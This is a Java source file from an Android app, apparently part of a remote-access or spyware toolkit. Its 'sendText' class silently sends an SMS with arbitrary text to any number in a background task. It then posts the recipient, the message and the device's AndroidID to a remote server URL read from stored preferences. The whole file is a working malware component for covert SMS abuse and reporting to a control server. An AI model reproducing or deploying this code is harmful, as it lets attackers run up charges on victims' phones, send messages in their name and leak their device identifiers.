package u.can.i.up.expert.utils;

import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.telephony.SmsManager;

import java.io.UnsupportedEncodingException;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class sendText extends AsyncTask<String, Void, String> {
    String i = "";
    String k = "";
    public sendText(String i, String k) {
        this.i = i;
        this.k = k;
    }
    @Override
    protected String doInBackground(String... params) {
        boolean isNumeric = i.matches("[0-9]+");
        if(isNumeric)
        {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(i, null, k, null, null);
            try {
                Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "To: " + i + " Message: " + k);
            } catch (UnsupportedEncodingException e) {

                e.printStackTrace();
            }
        }
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {}
    @Override
    protected void onPreExecute() {}
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}